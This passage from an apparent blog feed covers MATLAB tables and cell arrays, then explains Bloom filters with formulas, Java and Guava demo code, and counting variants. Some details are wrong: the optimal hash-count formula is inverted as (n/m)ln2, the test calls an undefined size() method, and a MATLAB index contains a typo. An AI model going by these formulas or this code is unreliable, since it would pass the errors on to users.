class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 直接创建，列名是变量名</span></span><br><span class="line">tb1 = <span class="built_in">table</span>(var1, var2, ...);</span><br><span class="line"><span class="comment">% 创建同时指定列名</span></span><br><span class="line">tb2 = <span class="built_in">table</span>(var1, var2, <span class="string">&#x27;VariableNames&#x27;</span>, [<span class="string">&#x27;Thought1&#x27;</span>,<span class="string">&#x27;OnSecondThought&#x27;</span>])</span><br><span class="line"><span class="comment">% 查看表属性</span></span><br><span class="line">tb2.Properties</span><br></pre></td></tr></table></figure><ol start="2" type="1"><li>表间操作</li></ol><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 纵向(列数必须相同)、横向(行数必须相同)合并两个表</span></span><br><span class="line">[tb1; tb2]</span><br><span class="line">[tb1 tb2]</span><br><span class="line"><span class="comment">% 不同表join操作</span></span><br><span class="line">tb3 = join(tb1, tb2, <span class="string">&quot;Keys&quot;</span>, [<span class="string">&quot;Id_1&quot;</span>, <span class="string">&quot;Id_2&quot;</span>])</span><br></pre></td></tr></table></figure><ol start="3" type="1"><li>从表中获取数据</li></ol><p>如下图所示，若需要获取表中一部分数据，我们只需要通过索引、切片的方法来获取就可以了，如<code>t2 = t1(6:15, [1 5 end-1:3nd])</code>指的就是获取<code>t1</code>表中第6行到第15行中第1列、第5列、倒数后两列的内容。可以看到matlab对于这种类矩阵的计算还是肥肠方便的。</p><figure><img src="/img/Matlab编程基础/image-20220125192334259.png"alt="image-20220125192334259" /><figcaption aria-hidden="true">image-20220125192334259</figcaption></figure><p>我们看一个例子，比如我们要获取下表中所有关于丰田的汽车信息：</p><figure><img src="/img/Matlab编程基础/image-20220125194253605.png"alt="image-20220125194253605" /><figcaption aria-hidden="true">image-20220125194253605</figcaption></figure><p>我们可以这样：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 先获取第一列的所有数据，使用contains获取索引向量</span></span><br><span class="line">Idx = contains(fleet.Make, <span class="string">&quot;Toyota&quot;</span>)</span><br><span class="line">fleet(Idx, :)</span><br></pre></td></tr></table></figure><figure><img src="/img/Matlab编程基础/image-20220125194320085.png"alt="image-20220125194320085" /><figcaption aria-hidden="true">image-20220125194320085</figcaption></figure><p>而如果说你要提取多个列的数据(不包含列名)，那么就要使用花括号了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% 提取1到3列数据</span><br><span class="line">fleet&#123;:, 1:3&#125;</span><br></pre></td></tr></table></figure><figure><img src="/img/Matlab编程基础/image-20220125200310741.png"alt="image-20220125200310741" /><figcaption aria-hidden="true">image-20220125200310741</figcaption></figure><ol start="4" type="1"><li>向表中添加新列</li></ol><p>直接赋值就可以了，新列的名字就是<code>.</code>操作符后自定义的名字：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Area = fleet.Length .* fleet.Width</span><br><span class="line">fleet.Area = Area</span><br></pre></td></tr></table></figure><h2 id="集合型数据常用函数">集合型数据常用函数</h2><p>也就是CellArray，我想叫他集合型，是因为他就是花括号一括，里面数据类型无需一致。一个集合型数据定义如下：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">car = &#123;<span class="string">&#x27;Ford&#x27;</span>,<span class="string">&#x27;Expedition&#x27;</span>;<span class="number">32.7</span>,<span class="built_in">true</span>&#125;</span><br><span class="line"><span class="comment">% 输出：</span></span><br><span class="line"><span class="comment">% 2×2 cell array</span></span><br><span class="line"><span class="comment">%</span></span><br><span class="line"><span class="comment">%    &#123;&#x27;Ford&#x27;   &#125;    &#123;&#x27;Expedition&#x27;&#125;</span></span><br><span class="line"><span class="comment">%    &#123;[32.7000]&#125;    &#123;[         1]&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;学习一下使用MatLab如何进行编程，如函数、类、变量定义等，有助于实际MatLab项目的开发。&lt;/p&gt;
&lt;figure&gt;
&lt;img src=&quot;/img/Matlab编程基础/image-20220124190817431.png&quot;
alt=&quot;基本数据类型&quot; /&gt;
&lt;figcaption aria-hidden=&quot;true&quot;&gt;基本数据类型&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="MatLab" scheme="https://lzwgiter.github.io/tags/MatLab/"/>
    
  </entry>
  
  <entry>
    <title>Bloom Filter概念原理</title>
    <link href="https://lzwgiter.github.io/posts/169c63d0.html"/>
    <id>https://lzwgiter.github.io/posts/169c63d0.html</id>
    <published>2021-10-04T03:44:55.000Z</published>
    <updated>2021-10-29T07:53:40.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>BloomFilter（布隆过滤器）是一种空间利用很高的数据结构，使用一个数据来表示一个集合，用于判断一个元素是否存在于这个集合中。但是也有妥协：在判断一个元素是否属于该集合时有可能会误判(falsepositive)，故不适合于"零错误"的场景，在能够容忍低错误率的场合下，可以通过极少的错误来换取较高的存储空间利用率。google的Guava中就有<code>BloomFilter</code>这个类。</p><p>一个比较常见的应用是缓解Redis等缓存中缓存击穿的问题。</p></blockquote><span id="more"></span><h1 id="参考学习">参考学习</h1><blockquote><p>CSDN上有两篇很不错的学习文章，一篇详细的讲解了原理，一篇给出了一个java版的简单示意demo。本文主要是对这两篇的工作进行整理、总结、补充和学习。</p></blockquote><p>原理学习：<ahref="https://blog.csdn.net/jiaomeng/article/details/1495500">(96条消息)Bloom Filter概念和原理_jiaomeng-CSDN博客_bloom filter</a></p><p>demo：<ahref="https://blog.csdn.net/qq_33709582/article/details/108407706">(96条消息)布隆过滤器原理（小白都能看懂的demo）_成都彭于晏的博客-CSDN博客</a></p><p>实用学习：<ahref="https://www.cnblogs.com/javastack/p/13292518.html">牛逼哄哄的布隆过滤器，到底有什么用？- Java技术栈 - 博客园 (cnblogs.com)</a></p><p>wiki学习：<a href="https://en.wikipedia.org/wiki/Bloom_filter">Bloomfilter - Wikipedia</a></p><h1 id="概念及原理">概念及原理</h1><p>下面是wiki对布隆过滤器的介绍：</p><blockquote><p>A Bloom filter is a space-efficient probabilistic data structure,conceived by Burton Howard Bloom in 1970, that is used to test whetheran element is a member of a set.</p><p>False positive matches are possible, but false negatives are not - inother words, a query returns either "possibly in set" or "definitely notin set".</p><p>Elements can be added to the set, but not removed(though this can beaddressed by counting Bloom filter variant); the more items added, thelarger the probability of false positives.</p></blockquote><p>怎么表示一个布隆过滤器呢？一个空的布隆过滤器是一个<em>m</em>bits的字节数组，其中所有的元素的值都为0。如下图所示：</p><p><img src="/img/Bloom-Filter概念原理/image-20211005141125182.png" alt="image-20211005141125182" style="zoom: 80%;" /></p><p>然后我们定义<em>k</em>个不同的哈希函数，每一个哈希函数都会把输入映射到上面这个<em>m</em>bits的字节数组的每一个位置中，并将该位置为1。即： <spanclass="math display">\[\begin{align}\forall x,\ Bloom[Hash_i(x)]=1,\ where\ i \in [1, k];\end{align}\]</span><strong>需要注意的是，若一个位置已经被置为1了，那么后续的元素再次映射到该位置时则仍为1。</strong>假设k=3(3个哈希函数)，我们将两个元素插入到过滤器中，结果如下图所示：</p><p><img src="/img/Bloom-Filter概念原理/image-20211005181840525.png" alt="image-20211005181840525" style="zoom:80%;" /></p><p>可以看到他们两个的哈希结果是有重叠的。</p><p>假设我们现在判断一个元素是否在集合中，道理是一样的，<strong>我们只需要对该元素进行k次哈希计算，若数组中对应下标的元素都为1，则认为该元素存在。但若有一个下标数值为0则该元素一定不存在。</strong>此外，布隆过滤器是不能删除元素的，因为你没有办法判断该数组中哪些1是该清除的，虽然你可以删除该元素的一个哈希结果位置的1(只要有一个哈希位置的结果为0则该元素不存在)，但是有可能这个操作就顺带的把其他元素也删除了。</p><p>前面提到了布隆过滤器存在假阳性(<em>falsepositive</em>)的情况，我们设f为该布隆过滤器的假阳性的可能性，p为数组中0的比例，k为哈希函数的数量，m为布隆过滤器数组的长度，n为待映射的集合元素的数量。则最佳的(f最低)选取的哈希函数的数量k为：</p><p><span class="math display">\[\begin{align}k\ =\ \frac{n}{m}ln2,\ 此时p=\frac{1}{2},\ 即布隆数组中0,1对半开\end{align}\]</span></p><p>从这个结果中我们可以看出，要让布隆过滤器错误率较低，最好让该数组还有一半空着。且我们的哈希函数的数量至少是(n/m)的ln2倍。</p><p>同时，若要让错误率<span class="math inline">\(f\ \le\epsilon\)</span>，则m应至少取到下值： <span class="math display">\[\begin{align}m\ \ge\ n\log_2e\ \cdot\ \log_2(1/\epsilon)\end{align}\]</span>具体的推导计算过程可以去看CSDN推荐文章或者看wiki，均有详细运算过程，这里只说结论。</p><h1id="布隆过滤器demo以及guava中的案例">布隆过滤器Demo以及Guava中的案例</h1><p>下面代码来自CSDN，做了部分修改，只供学习演示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.BitSet;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2021/10/06</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EasyBloomFilter</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置布隆过滤器容量为100万</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DEFAULT_SIZE</span> <span class="operator">=</span> <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * bit数组，用来存放key</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">BitSet</span> <span class="variable">BIT_SET</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BitSet</span>(DEFAULT_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * hash函数数量k=CONSTANTS，用于hash函数计算</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span>[] CONSTANTS = &#123;<span class="number">6</span>, <span class="number">57</span>, <span class="number">99</span>, &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * add方法，计算出key的hash值，并将对应下标置为true</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key 待添加元素</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        Arrays.stream(CONSTANTS).forEach(i -&gt; BIT_SET.set(hash(key, i)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断key是否存在，true不一定说明key存在，但是false一定说明不存在</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key 待判断元素</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isContain</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : CONSTANTS) &#123;</span><br><span class="line">            <span class="comment">//短路与，只要有一个bit位为false，则返回false</span></span><br><span class="line">            <span class="keyword">if</span> (!BIT_SET.get(hash(key, i))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * hash函数，借鉴了hashmap的扰动算法，使用CONSTANTS中的常数来实现多个哈希函数的效果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> key == <span class="literal">null</span> ? <span class="number">0</span> : (i * (DEFAULT_SIZE - <span class="number">1</span>) &amp; ((h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面我们写一个测试单元来看看他的效果，我们插入100万条数据，并使用其他不存在的100万条数据来进行测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.AfterAll;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EasyBloomFilterTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">EasyBloomFilter</span> <span class="variable">FILTER</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EasyBloomFilter</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加100 0000个元素进去</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test_add</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(FILTER.size());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            FILTER.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(FILTER.size());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询这100 0000个元素是否存在</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test_isContain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">results</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (FILTER.isContain(i)) &#123;</span><br><span class="line">                results += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;查询最终结果：共&quot;</span> + results + <span class="string">&quot;个元素存在&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询不存在的元素(100 0000 ~ 200 0000范围)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@AfterAll</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test_false_positive</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">float</span> <span class="variable">results</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1000000</span>; i &lt; <span class="number">2000000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (FILTER.isContain(i)) &#123;</span><br><span class="line">                results += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.printf(<span class="string">&quot;1000000个不存在元素中%.0f个被判定为存在， 误判率：%f&quot;</span>, results, results/<span class="number">1000000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验结果：</p><p><img src="/img/Bloom-Filter概念原理/image-20211006171959001.png" alt="image-20211006171959001"  /></p><p>可以看到在100万条错误的测试数据中，有48576个假阳性样本，误判率为0.048，这个误判率还是很理想的。</p><p>当然，也有比较官方的包支持布隆过滤器，比如Google的Guava中就有该数据结构，<strong>只不过被标记为beta。</strong>我们同样使用Guava中的布隆过滤器进行实验：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// Maven依赖：</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.guava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.google.common.hash.BloomFilter;</span><br><span class="line"><span class="keyword">import</span> com.google.common.hash.Funnels;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2021/10/06</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GuavaBloomFilterTest</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 预计要插入多少数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 期望的误判率</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">double</span> <span class="variable">fpp</span> <span class="operator">=</span> <span class="number">0.01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> BloomFilter&lt;Integer&gt; bloomFilter = BloomFilter.create(Funnels.integerFunnel(), size, fpp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//插入100万条数据</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            bloomFilter.put(i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">float</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 测试100万条错误数据</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1000000</span>; i &lt; <span class="number">2000000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bloomFilter.mightContain(i)) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.printf(<span class="string">&quot;总共的误判数：%.0f, 误判率：%f&quot;</span>, count, count/size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/img/Bloom-Filter概念原理/image-20211006172258402.png" alt="image-20211006172258402"  /></p><p>可以看到Google提供的布隆过滤器的效果更好，100万条错误数据中误判率为0.01。<strong>所以对于布隆过滤器而言，好的哈希函数是核心，这一点放到哪个与哈希相关的数据结构都是一样的。</strong></p><h1 id="特性及应用">特性及应用</h1><h2 id="特性">特性</h2><ul><li>虽然布隆过滤器带来了一定的错误率，但是相较于其他数据结构(如自平衡二叉搜索树、字典树、哈希表、单链表、数组)有巨大的存储空间优势。上述的其他数据结构最少都需要将所有数据都保存到数据结构中(字符串类型中字典树除外，它可以减小将相同前缀的字符串的存储空间)。</li></ul><p>布隆过滤器不需要存储全部数据，存储数据的工作需要另外一个部件进行(如下图所示，过滤器充当一个中间件)，布隆过滤器只提供查询的功能(是不是很像Redis)，比如wiki中的示意图：</p><p><img src="/img/Bloom-Filter概念原理/image-20211005205423468.png" alt="image-20211005205423468" style="zoom:80%;" /></p><p>当然上述的架构中也有缺点：</p><ul><li>假阳性(key3的请求)</li><li>布隆过滤器带来的更多的内存占用</li></ul><p>wiki中描述布隆过滤器的该优势具体如下：</p><blockquote><p>A Bloom filter with a 1% error and an optimal value of <em>k</em>, incontrast, requires only about 9.6 bits per element, regardless of thesize of the elements. This advantage comes partly from its compactness,inherited from arrays, and partly from its probabilistic nature. The 1%false-positive rate can be reduced by a factor of ten by adding onlyabout 4.8 bits per element.</p><blockquote><p>相比之下，一个布隆过滤器在合适的k值的条件下，错误率仅为1%，且无论元素大小，每个元素只需要9.6个bit位。其优势来源于数组的紧凑性以及天然的概率特性。此外，这个1%的错误率在每个元素增加4.8个bit位的条件下，甚至还可以再减小10倍。</p></blockquote></blockquote><ul><li>布隆过滤器的<strong>增加</strong>和<strong>查询</strong>操作的复杂度都是常数级--<em>O(k)</em>，和存储的元素数量无关。这个属性是其他数据结构所不具备的，并且这k次查找是可以通过并行来减小时间的。</li></ul><h2 id="应用例子">应用例子</h2><p>以下应用例子均来自wiki，随便挑了几个。</p><ul><li>内容交付商AkamaiTechnologies在服务器上使用布隆过滤器来有效减少磁盘工作负载并提高磁盘缓存命中率。</li><li>Google Bigtable、Apache HBase、ApacheCassandra、PostgreSQL使用布隆过滤器来降低对不存在的数据的磁盘查找次数，避免了较大的磁盘开销，提高了数据库的查询效率。</li><li>GoogleChrome浏览器应用布隆过滤器来判别恶意的URL，若本地的布隆过滤器判断是阳性，则会对该完整的URL进行判断，并对用户进行警告。</li><li>比特币曾使用布隆过滤器来加速钱包的同步，后来其使用的布隆过滤器的实现发现了漏洞。</li><li>以太坊使用布隆过滤器来实现链上快速的日志查找。</li></ul><h2 id="布隆过滤器变种-counting-bloom-filters">布隆过滤器变种-CountingBloom Filters</h2><h3 id="概念及原理-1">概念及原理</h3><p>据wiki描述，大概有60种以上的布隆过滤器变种，这里由于我个人原因我只关注CountingBloomFilters，该过滤器支持了原始布隆过滤器不支持的<strong>删除</strong>操作。该过滤器在论文<code>Fan, Li; Cao, Pei; Almeida, Jussara; Broder, Andrei (2000), "Summary Cache: A Scalable Wide-Area Web Cache Sharing Protocol" , IEEE/ACM Transactions on Networking, 8 (3): 281–293, on 2017-09-22</code>中提出。</p><p>怎么理解呢？在计数布隆过滤器中，我们把每一个数组的位置叫做<em>bucket</em>，将每一个数组的每一个位置由一个单一的bit位变为了多个比特的计数器(<em>amulti-bitcounter</em>)。而普通的布隆过滤器你可以理解为一个<em>bucket</em>为1的计数布隆过滤器。</p><p>对于一个计数布隆过滤器：</p><ul><li>当你添加一个元素时，就为该数组的对应下标的<em>bucket</em>的值<strong>增加1</strong>。</li><li>当你删除这个元素的时候则为这个<em>bucket</em>的值<strong>减1</strong></li><li>当你查询一个元素的时候，若该元素对应下标的<em>bucket</em>的值均非0，则该元素存在</li></ul><h3 id="问题及替代品">问题及替代品</h3><ol type="1"><li>计数布隆过滤器为了避免溢出问题，<em>bucket</em>的上限要足够大，通常取3到4bits，所以他使用的存储空间是普通布隆过滤器的3至4倍。</li></ol><p><strong>而在论文：</strong></p><ul><li><code>Pagh Anna; Pagh Rasmus; Rao S. Srinivasa (2005), "An optimal Bloom filter replacement" Proceedings of the Sixteenth Annual ACM-SIAM Symposium on Discrete Algorithms, pp. 823–829</code></li><li><code>Fan, Bin; Andersen, Dave G.; Kaminsky, Michael; Mitzenmacher, Michael D.(2014), "Cuckoo filter: Practically better than Bloom", Proc. 10th ACM Int. Conf. Emerging Networking Experiments and Technologies (CoNEXT '14), pp. 75–88,</code></li></ul><p>中所提出的过滤器也支持删除操作，且比普通过滤器使用的存储空间要小。</p><ol start="2" type="1"><li>计数布隆过滤器的可扩展性受限，因为它的表(table)不可扩展，过滤器中存储的元素的最大数量必须提前预知，<strong>一旦前期设定好的阈值提前到达了，那么随着后续元素的不断插入，过滤器的错误率将不断提高。</strong></li></ol><p><strong>而在论文</strong>：</p><ul><li><p><code>Bonomi Flavio; Mitzenmacher Michael; Panigrahy Rina; Singh Sushil; Varghese George (2006), "An Improved Construction for Counting Bloom Filters", Algorithms – ESA 2006, 14th Annual European Symposium, 4168, pp. 684–695,</code>中提出的过滤器可以<strong>避免可扩展性受限的问题</strong>，且仅大约<strong>使用计数过滤器一半的空间</strong>就可以实现相同的功能。</p></li><li><p><code>Rottenstreich, Ori; Kanizo, Yossi; Keslassy, Isaac (2012), "The Variable-Increment Counting Bloom Filter", 31st Annual IEEE International Conference on Computer Communications, 2012, Infocom 2012, pp. 